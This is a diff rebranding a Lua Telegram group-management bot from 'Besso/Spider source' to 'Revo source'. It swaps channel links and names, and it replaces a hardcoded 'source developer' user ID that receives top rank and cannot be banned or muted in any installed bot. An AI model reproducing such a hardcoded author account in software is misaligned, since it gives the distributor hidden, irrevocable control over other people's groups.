@@ -8,7 +8,7 @@ https   = require("ssl.https")
 sudos   = dofile("sudo.lua")
 bot_id  = token:match("(%d+)")  
 Id_Sudo = Sudo
-List_Sudos = {Id_Sudo,620800281}
+List_Sudos = {Id_Sudo,1175059064}
 User = io.popen("whoami"):read('*a')
 IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a')
 name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a')
@@ -155,7 +155,7 @@ end
 return var
 end 
 function Rank_Checking(user_id,chat_id)
-if tonumber(user_id) == tonumber(620800281) then  
+if tonumber(user_id) == tonumber(1175059064) then  
 var = true  
 elseif tonumber(user_id) == tonumber(Id_Sudo) then
 var = true  
@@ -183,7 +183,7 @@ end
 return var
 end 
 function Get_Rank(user_id,chat_id)
-if tonumber(user_id) == tonumber(620800281) then  
+if tonumber(user_id) == tonumber(1175059064) then  
 var = 'مطور السورس'
 elseif Devspidere(user_id) == true then
 var = "المطور الاساسي"  
@@ -425,7 +425,7 @@ ID="InputMessageAudio",
 audio_ = GetInputFile(audio),
 duration_ = "",
 title_ = title or "",
-performer_ = "سورس بيسوالرسمي",
+performer_ = "سورس ريفوالرسمي",
 caption_ = caption or ""
 }},func or dl_cb,nil)
 end
@@ -500,7 +500,7 @@ end
 function Reply_Status(msg,user_id,status,text)
 tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,data) 
 if data.first_name_ ~= false then
-local UserName = (data.username_ or "Vc33h")
+local UserName = (data.username_ or "JFFFFF")
 local NameUser = "⋄︙بواسطه > ["..data.first_name_.."](T.me/"..UserName..")"
 local NameUserr = "⋄︙المستخدم > ["..data.first_name_.."](T.me/"..UserName..")"
 if status == "lock" then
@@ -3473,7 +3473,7 @@ if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
 send(msg.chat_id_,msg.id_,"⋄︙عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
 return false 
 end      
-if result.id_ == tonumber(620800281) then
+if result.id_ == tonumber(1175059064) then
 send(msg.chat_id_, msg.id_, "⋄︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -3496,7 +3496,7 @@ if userid == tonumber(Id_Sudo) then
 send(msg.chat_id_, msg.id_, "⋄︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور البوت الاساسي \n")
 return false 
 end
-if userid == tonumber(620800281) then
+if userid == tonumber(1175059064) then
 send(msg.chat_id_, msg.id_, "⋄︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -4759,7 +4759,7 @@ send(msg.chat_id_, msg.id_,'⋄︙لقد تم تعطيل الحظر و الطر�
 return false
 end
 function Function_spider(extra, result, success)
-if result.sender_user_id_ == tonumber(620800281) then
+if result.sender_user_id_ == tonumber(1175059064) then
 send(msg.chat_id_, msg.id_, "⋄︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -4796,7 +4796,7 @@ if result.id_ == tonumber(Id_Sudo) then
 send(msg.chat_id_, msg.id_, "⋄︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور البوت \n")
 return false 
 end
-if result.id_ == tonumber(620800281) then
+if result.id_ == tonumber(1175059064) then
 send(msg.chat_id_, msg.id_, "⋄︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -4839,7 +4839,7 @@ if userid == tonumber(Id_Sudo) then
 send(msg.chat_id_, msg.id_, "⋄︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور البوت \n")
 return false 
 end
-if userid == tonumber(620800281) then
+if userid == tonumber(1175059064) then
 send(msg.chat_id_, msg.id_, "⋄︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -4909,7 +4909,7 @@ end
 
 if text == ("كتم") and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then   
 function Function_spider(extra, result, success)
-if result.sender_user_id_ == tonumber(620800281) then
+if result.sender_user_id_ == tonumber(1175059064) then
 send(msg.chat_id_, msg.id_, "⋄︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس  \n")
 return false 
 end
@@ -4939,7 +4939,7 @@ return false
 end
 function Function_spider(extra, result, success)
 if result.id_ then
-if result.id_ == tonumber(620800281) then
+if result.id_ == tonumber(1175059064) then
 send(msg.chat_id_, msg.id_, "⋄︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -4962,7 +4962,7 @@ return false
 end
 if text and text:match("^كتم (%d+)$") and Addictive(msg) then   
 local userid = text:match("^كتم (%d+)$")
-if userid == tonumber(620800281) then
+if userid == tonumber(1175059064) then
 send(msg.chat_id_, msg.id_, "⋄︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -6216,7 +6216,7 @@ local Text= [[
 - #stast > موقع المستخدم 
 - #edit > عدد السحكات
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-𝘊𝘩 - [𝘚𝘱𝘪𝘥𝘦𝘳 𝘴𝘰𝘳𝘶𝘤𝘦](http://t.me/Vc33h)
+𝘊𝘩 - [Revo 𝘴𝘰𝘳𝘶𝘤𝘦](http://t.me/JFFFFF)
 ]]
 send(msg.chat_id_, msg.id_,Text)
 database:set(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,"true1")
@@ -6436,7 +6436,7 @@ local Text= [[
 - #stast > موقع المستخدم 
 - #edit > عدد السحكات
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-𝘊𝘩 - [𝘚𝘱𝘪𝘥𝘦𝘳 𝘴𝘰𝘳𝘶𝘤𝘦](http://t.me/Vc33h)
+𝘊𝘩 - [Revo 𝘴𝘰𝘳𝘶𝘤𝘦](http://t.me/JFFFFF)
 ]]
 send(msg.chat_id_, msg.id_,Text)
 database:set(bot_id.."Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
@@ -6914,7 +6914,7 @@ if text == 'الرتبه' and tonumber(msg.reply_to_message_id_) > 0 then
 function start_function(extra, result, success)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
 local rtp = Get_Rank(result.sender_user_id_,msg.chat_id_)
-local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'Vc33h')..')'
+local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'JFFFFF')..')'
 local iduser = result.sender_user_id_
 send(msg.chat_id_, msg.id_,'*- العضو > (*'..username..'*)\n- الرتبه > ('..rtp..')*\n')
 end,nil)
@@ -7240,7 +7240,7 @@ if b.first_name_ == false then
 send(msg.chat_id_, msg.id_,"⋄︙حساب المنشئ محذوف")
 return false  
 end
-local UserName = (b.username_ or "Vc33h")
+local UserName = (b.username_ or "JFFFFF")
 send(msg.chat_id_, msg.id_,"⋄︙منشئ المجموعه ~ ["..b.first_name_.."](T.me/"..UserName..")")  
 end,nil)   
 end
@@ -7260,7 +7260,7 @@ if b.first_name_ == false then
 send(msg.chat_id_, msg.id_,"⋄︙حساب المنشئ محذوف")
 return false  
 end
-local UserName = (b.username_ or "Vc33h")
+local UserName = (b.username_ or "JFFFFF")
 send(msg.chat_id_, msg.id_,"⋄︙تم ترقية منشئ المجموعه ~ ["..b.first_name_.."](T.me/"..UserName..")")  
 database:sadd(bot_id.."creator"..msg.chat_id_,b.id_)
 end,nil)   
@@ -7284,8 +7284,8 @@ database:srem(bot_id.."Chek:Groups",GP_ID[2])
 return false 
 end
 end
-if text == (database:get(bot_id.."Name:Bot") or "بيسو") then      
-Namebot = (database:get(bot_id.."Name:Bot") or "بيسو")
+if text == (database:get(bot_id.."Name:Bot") or "ريفو") then      
+Namebot = (database:get(bot_id.."Name:Bot") or "ريفو")
 local namebot = {
 'ۿۧهلا ؏ـمࢪي .',
 'اكلك تحبني ؟ وتصيحني هلكد',
@@ -7300,7 +7300,7 @@ send(msg.chat_id_, msg.id_, namebot[name])
 return false 
 end
 if text == "بوت" then
-Namebot = (database:get(bot_id.."Name:Bot") or "بيسو")
+Namebot = (database:get(bot_id.."Name:Bot") or "ريفو")
 send(msg.chat_id_, msg.id_,"اسمي ["..Namebot.."] ") 
 end
 if text == "تغير اسم البوت" or text == "تغيير اسم البوت" or text == "حذف اسم البوت" then 
@@ -8533,7 +8533,7 @@ Teext = [[
  لعبة خمن >> خمن
  لعبة بات >> بات
 ⋄━━━━━━━━⋄
-- Ch [𝘚𝘱𝘪𝘥𝘦𝘳 𝘴𝘰𝘳𝘶𝘤𝘦 -](https://t.me/Vc33h)
+- Ch [Revo 𝘴𝘰𝘳𝘶𝘤𝘦 -](https://t.me/JFFFFF)
 ]]
 send(msg.chat_id_, msg.id_,Teext) 
 end
@@ -8930,7 +8930,7 @@ if audios.Info == true then
 local Text ='⋄︙تم اختيار المقطع الصوتي لك'
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '- 𝒔𝒑𝒊𝒅𝒆𝒓 𝒔𝒐𝒓𝒖𝒄𝒆 .',url="t.me/Vc33h"}},
+{{text = '- 𝒔𝒑𝒊𝒅𝒆𝒓 𝒔𝒐𝒓𝒖𝒄𝒆 .',url="t.me/JFFFFF"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice='..URL.escape(audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -9187,7 +9187,7 @@ end
 Text = "[𝘞𝘦𝘭𝘤𝘰𝘮𝘦 𝘵𝘰 ـ BeSsO Source ـ ](t.me/BESSO500K)"
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'ـ BeSsO Source ـ  .',url="https://t.me/MUSIC_REMAS_3"}},
+{{text = 'ـ BeSsO Source ـ  .',url="https://t.me/JFFFFF"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -9239,23 +9239,6 @@ local texting = {"ما ما ما اخجل شني 😭??💞","ماا وخر ما
 send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
 return false
 end
-if text == 'اريد بوت' or text == 'اريد مطور' or text == 'خوش سورس' or text == 'سورس بيسو' or text == 'اريد بوت تمبلر' or text == 'سورس بيسو' then
-Text = [[
-•- DEV @FSFFF مبرمج بوتات•
-]]
-send(msg.chat_id_, msg.id_,Text)
-return false
-end
-if text == 'اريد انصب بوت' or text == 'عجبني البوت' or text == 'منو منصبلك' or text == 'منو مطور السورس' or text == 'مطور السورس' or text == 'انصبلك'  or text == 'انصبلك بوت' then
-Text = [[
-اهلا عزيزي
-متوفر تنصيب بوتات ع سورس بيسو
-احدث واسرع البوتات وضمان الثقه
-للاستفسار راسل المطور @FSFFF
-]]
-send(msg.chat_id_, msg.id_,Text)
-return false
-end
 if text == 'م1' or text == 'م2' or text == 'م3' or text == 'م4' or text == 'م5' then     
 Text = [[
 اهلا عزيزي
@@ -9272,7 +9255,7 @@ Text =[[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-	{{text = ' ● رابط بوت الحذف تليكرام ●.',url="https://t.me/Y5BBOT"}},
+
 {{text = ' ● رابط حذف تلي كرام ●.',url="https://my.telegram.org/auth?to=delete"}},
 {{text = ' ● رابط حذف الانستا ●.',url="https://www.instagram.com/accounts/login/?next=/accounts/remove/request/permanent/"}},
 {{text = '● رابط حذف فيسبوك ● .',url="https://www.facebook.com/help/deleteaccount"}},
@@ -9297,7 +9280,7 @@ local Text =[[
 ⌔︙لعرض اوامر المطورين  ⌯ 𝟓 ⌯ .
 ⌯ اضغط ( اوامر التسليه ) لرؤيتها 
  —ـ—ـ—ـ—ـ—ـ—ـ—ـ—ـ—
-•[- 𝗠𝘂𝘀𝗶𝗰 مـيـوزڪٓـك ♪](t.me/MUSIC_REMAS_3)• •
+•[- ريفو](t.me/JFFFFF)• •
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -9510,7 +9493,7 @@ end
 if Chat_Type == 'UserBot' then
 if text == '/start' then  
 if Devspider(msg) then
-local Text =  '-  𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝒔𝒑𝒊𝒅𝒆𝒓 المطور الاساسي \n- سورس بيسو\n- يمكنك التحكم في الكيبورد من الاسفل\n- [تابع جديدنا](t.me/Vc33h) '
+local Text =  '-  𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝒔𝒑𝒊𝒅𝒆𝒓 المطور الاساسي \n- سورس ريفو\n- يمكنك التحكم في الكيبورد من الاسفل\n- [تابع جديدنا](t.me/JFFFFF) '
 local keyboard = {
 {'الاحصائيات ⋄','تغيير المطور الاساسي ⋄'},
 {'تفعيل التواصل ⋄','تعطيل التواصل ⋄'},
@@ -9544,7 +9527,7 @@ if start then
 Test = start
 else
 tdcli_function ({ID = "GetUser",user_id_ = Sudo},function(arg,data) 
-Test =  '- هلا عزيزي\n- انا بوت اسمي '..Namebot..'\n- اختصاصي حمايه المجموعات\n من التفليش وبعض الاوامر الخدميه للتسليه والخ…\n-لتفعيلي اتبع الخطوات…↓\n- اضفني الي مجموعتك وقم بترقيتي ادمن واكتب كلمه { تفعيل }  ويستطيع >{ منشئ او المشرفين } بتفعيلي فقط\n[⋄︙𝘊𝘩 𝘴𝘰𝘶𝘳𝘴𝘦⋄︙](http://t.me/Vc33h)'
+Test =  '- هلا عزيزي\n- انا بوت اسمي '..Namebot..'\n- اختصاصي حمايه المجموعات\n من التفليش وبعض الاوامر الخدميه للتسليه والخ…\n-لتفعيلي اتبع الخطوات…↓\n- اضفني الي مجموعتك وقم بترقيتي ادمن واكتب كلمه { تفعيل }  ويستطيع >{ منشئ او المشرفين } بتفعيلي فقط\n[⋄︙𝘊𝘩 𝘴𝘰𝘶𝘳𝘴𝘦⋄︙](http://t.me/JFFFFF)'
 end,nil)
 end 
 send(msg.chat_id_, msg.id_, Test) 
@@ -9831,7 +9814,7 @@ local A = io.open("sudo.lua", 'w')
 A:write([[
 s = "H_4_L"
 
-q = "Vc33h"
+q = "JFFFFF"
 
 token = "]]..token..[["
 
@@ -10201,7 +10184,7 @@ local Teext =[[
 ⋄︙الكلايش
 ⋄︙السيلفي
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-•[- 𝗠𝘂𝘀𝗶𝗰 مـيـوزڪٓـك ♪](t.me/MUSIC_REMAS_3)•
+•[- ريفو](t.me/JFFFFF)•
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -10272,7 +10255,7 @@ local Teext =[[
 ⋄︙مسح الصلاحيات
 ⋄︙مسح الرابط
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-•[- 𝗠𝘂𝘀𝗶𝗰 مـيـوزڪٓـك ♪](t.me/MUSIC_REMAS_3)•
+•[- ريفو](t.me/JFFFFF)•
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -10318,7 +10301,7 @@ local Teext =[[
 ⋄︙تفعيل/تعطيل اوامر التحشيش
 ⋄︙تفعيل/تعطيل الرابط/جلب الرابط
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-•[- 𝗠𝘂𝘀𝗶𝗰 مـيـوزڪٓـك ♪](t.me/MUSIC_REMAS_3)•
+•[- ريفو](t.me/JFFFFF)•
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -10353,7 +10336,7 @@ local Teext =[[
 ⋄︙اضف رسائل + العدد بالرد
 ⋄︙اضف مجوهرات+ العدد بالرد
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-•[- 𝗠𝘂𝘀𝗶𝗰 مـيـوزڪٓـك ♪](t.me/MUSIC_REMAS_3)•
+•[- ريفو](t.me/JFFFFF)•
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -10412,7 +10395,7 @@ local Teext =[[
 ⋄︙رفع/تنزيل منشئ اساسي
 ⋄︙مسح المنشئين الاساسين
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-•[- 𝗠𝘂𝘀𝗶𝗰 مـيـوزڪٓـك ♪](t.me/MUSIC_REMAS_3)•
+•[- ريفو](t.me/JFFFFF)•
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -10454,7 +10437,7 @@ local Teext =[[
 *⋄︙رزله*
 *⋄︙هينه*
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-•[- 𝗠𝘂𝘀𝗶𝗰 مـيـوزڪٓـك ♪](t.me/MUSIC_REMAS_3)•
+•[- ريفو](t.me/JFFFFF)•
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -10478,7 +10461,7 @@ local Teext =[[
 ⌔︙لعرض اوامر المطورين  ⌯ 𝟓 ⌯ .
 ⌯ اضغط ( اوامر التسليه ) لرؤيتها 
  —ـ—ـ—ـ—ـ—ـ—ـ—ـ—ـ—
-•[- 𝗠𝘂𝘀𝗶𝗰 مـيـوزڪٓـك ♪](t.me/MUSIC_REMAS_3)•
+•[- ريفو](t.me/JFFFFF)•
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -10494,7 +10477,7 @@ local idchci = "-100"..idch
 local animation = DAata:match("^animation(.*)$"):gsub('chatid',''):gsub('chatid',''):gsub(idch,''):gsub('-100','')
 local Text ="⋄︙تم اللغاء منعها بنجاح"
 inline = {
-{{text = '⋄︙𝘚𝘱𝘪𝘥𝘦𝘳 𝘴𝘰𝘳𝘶𝘤𝘦  .',url='http://t.me/Vc33h'}},
+{{text = '⋄︙Revo 𝘴𝘰𝘳𝘶𝘤𝘦  .',url='http://t.me/JFFFFF'}},
 }
 https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
 send_inlin_key(Chat_id,Text,inline)
@@ -10505,7 +10488,7 @@ local idchci = database:get(bot_id.."Filter:msg")
 local photo = DAata:match("^pito(.*)$")
 local Text ="⋄︙تم اللغاء منعها بنجاح"
 inline = {
-{{text = '⋄︙𝘚𝘱𝘪𝘥𝘦𝘳 𝘴𝘰𝘳𝘶𝘤𝘦  .',url='http://t.me/Vc33h'}},
+{{text = '⋄︙Revo 𝘴𝘰𝘳𝘶𝘤𝘦  .',url='http://t.me/JFFFFF'}},
 }
 https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
 send_inlin_key(Chat_id,Text,inline)
@@ -10517,7 +10500,7 @@ local idchci = "-100"..idch
 local Sticker = DAata:match("^Sticker(.*)$"):gsub('chatid',''):gsub('chatid',''):gsub(idch,''):gsub('-100','')
 local Text ="⋄︙تم اللغاء منعه بنجاح"
 inline = {
-{{text = '⋄︙𝘚𝘱𝘪𝘥𝘦𝘳 𝘴𝘰𝘳𝘶𝘤𝘦  .',url='http://t.me/Vc33h'}},
+{{text = '⋄︙Revo 𝘴𝘰𝘳𝘶𝘤𝘦  .',url='http://t.me/JFFFFF'}},
 }
 https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
 send_inlin_key(Chat_id,Text,inline)
@@ -10527,7 +10510,7 @@ if DAata and DAata:match("^delallSticker(.*)$") and Addictive(data) then
 local delallSticker = DAata:match("^delallSticker(.*)$")
 local Text ="⋄︙تم اللغاء منع كل المتحركات"
 inline = {
-{{text = '⋄︙𝘚𝘱𝘪𝘥𝘦𝘳 𝘴𝘰𝘳𝘶𝘤𝘦  .',url='http://t.me/Vc33h'}},
+{{text = '⋄︙Revo 𝘴𝘰𝘳𝘶𝘤𝘦  .',url='http://t.me/JFFFFF'}},
 }
 https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
 send_inlin_key(Chat_id,Text,inline)
@@ -10540,7 +10523,7 @@ if DAata and DAata:match("^delallanimation(.*)$") and Addictive(data) then
 local delallmation = DAata:match("^delallanimation(.*)$")
 local Text ="⋄︙تم اللغاء منع كل المتحركات"
 inline = {
-{{text = '⋄︙𝘚𝘱𝘪𝘥𝘦𝘳 𝘴𝘰𝘳𝘶𝘤𝘦  .',url='http://t.me/Vc33h'}},
+{{text = '⋄︙Revo 𝘴𝘰𝘳𝘶𝘤𝘦  .',url='http://t.me/JFFFFF'}},
 }
 https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
 send_inlin_key(Chat_id,Text,inline)
@@ -10553,7 +10536,7 @@ if DAata and DAata:match("^delallph(.*)$") and Addictive(data) then
 local delallph = DAata:match("^delallph(.*)$")
 local Text ="⋄︙تم اللغاء منع كل الصور"
 inline = {
-{{text = '⋄︙𝘚𝘱𝘪𝘥𝘦𝘳 𝘴𝘰𝘳𝘶𝘤𝘦  .',url='http://t.me/Vc33h'}},
+{{text = '⋄︙Revo 𝘴𝘰𝘳𝘶𝘤𝘦  .',url='http://t.me/JFFFFF'}},
 }
 https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
 send_inlin_key(Chat_id,Text,inline)
@@ -10679,7 +10662,7 @@ if NewCmmd then
 data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
 end
 end
-local Name_Bot = (database:get(bot_id.."Name:Bot") or "بيسو")
+local Name_Bot = (database:get(bot_id.."Name:Bot") or "ريفو")
 if not database:get(bot_id.."Fun_Bots"..msg.chat_id_) then
 if text ==  ""..Name_Bot..' شنو رئيك بهاذا' and tonumber(msg.reply_to_message_id_) > 0 then     
 function FunBot(extra, result, success) 
